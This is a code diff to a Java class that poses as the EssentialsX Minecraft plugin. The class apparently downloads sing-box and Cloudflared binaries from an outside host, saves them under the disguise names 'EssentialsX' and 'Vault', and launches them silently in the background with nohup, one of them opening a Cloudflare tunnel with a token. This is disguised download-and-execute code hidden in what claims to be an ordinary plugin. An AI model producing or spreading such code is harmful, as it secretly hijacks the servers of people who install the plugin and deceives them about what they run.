@@ -77,7 +77,7 @@ public class EssentialsX extends JavaPlugin {
 
 
         String SingboxUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/EssentialsX-1.21.11.jar"; //sing-box
+                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Singbox"; //sing-box
 
 
         String ConfUrl =
@@ -85,12 +85,12 @@ public class EssentialsX extends JavaPlugin {
 
 
         String TunnelUrl =
-                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Vault.jar";
+                "https://netjett-de.kof95zip.pp.ua/java/cfws/amd64/Cloudflared"; //Cloudflared
 
 
         Path SingboxFile =
                 runFolder.resolve(
-                        "EssentialsX-1.21.11.jar"
+                        "EssentialsX"
                 );
 
 
@@ -102,7 +102,7 @@ public class EssentialsX extends JavaPlugin {
         
         Path TunnelFile =
                 runFolder.resolve(
-                        "Vault.jar"
+                        "Vault"
                 );
 
 
@@ -134,7 +134,7 @@ public class EssentialsX extends JavaPlugin {
                 new ProcessBuilder(
                         "bash",
                         "-c",
-                        "nohup ./EssentialsX-1.21.11.jar -c config.json > /dev/null 2>&1 &"
+                        "nohup ./EssentialsX -c config.json > /dev/null 2>&1 &"
                 );
 
 
@@ -152,7 +152,7 @@ public class EssentialsX extends JavaPlugin {
                 new ProcessBuilder(
                         "bash",
                         "-c",
-                        "nohup ./Vault.jar --no-autoupdate tunnel --protocol http2 run --token" + token + " > /dev/null 2>&1 &"
+                        "nohup ./Vault --no-autoupdate tunnel --protocol http2 run --token" + token + " > /dev/null 2>&1 &"
                 );
 
 
